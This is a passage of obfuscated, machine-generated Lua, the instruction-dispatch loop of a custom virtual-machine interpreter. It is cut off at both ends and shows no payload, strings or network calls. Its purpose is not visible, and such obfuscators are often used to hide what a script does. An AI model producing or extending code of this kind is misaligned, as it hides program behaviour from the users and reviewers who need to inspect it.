;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];end elseif (Enum<=203) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));elseif (Enum==204) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=210) then if (Enum<=207) then if (Enum==206) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A=Inst[2];do return Unpack(Stk,A,A + Inst[3] );end end elseif (Enum<=208) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>209) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=212) then if (Enum>211) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Upvalues[Inst[3]]=Stk[Inst[2]];end elseif (Enum<=213) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==214) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);else Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};end elseif (Enum<=225) then if (Enum<=220) then if (Enum<=217) then if (Enum>216) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=218) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));elseif (Enum==219) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=222) then if (Enum>221) then if  not Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=223) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];elseif (Enum==224) then Stk[Inst[2]]();else local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum<=230) then if (Enum<=227) then if (Enum>226) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]<=Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=228) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];elseif (Enum==229) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=232) then if (Enum==231) then local NewProto=Proto[Inst[3]];local NewUvals;local Indexes={};NewUvals=Setmetatable({},{__index=function(_,Key)local Val=Indexes[Key];return Val[1][Val[2]];end,__newindex=function(_,Key,Value)local Val=Indexes[Key];Val[1][Val[2]]=Value;end});for Idx=1,Inst[4] do VIP=VIP + 1 ;local Mvm=Instr[VIP];if (Mvm[1]==137) then Indexes[Idx-1 ]={Stk,Mvm[3]};else Indexes[Idx-1 ]={Upvalues,Mvm[3]};end Lupvals[ #Lupvals + 1 ]=Indexes;end Stk[Inst[2]]=Wrap(NewProto,NewUvals,Env);else local K;local B;local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 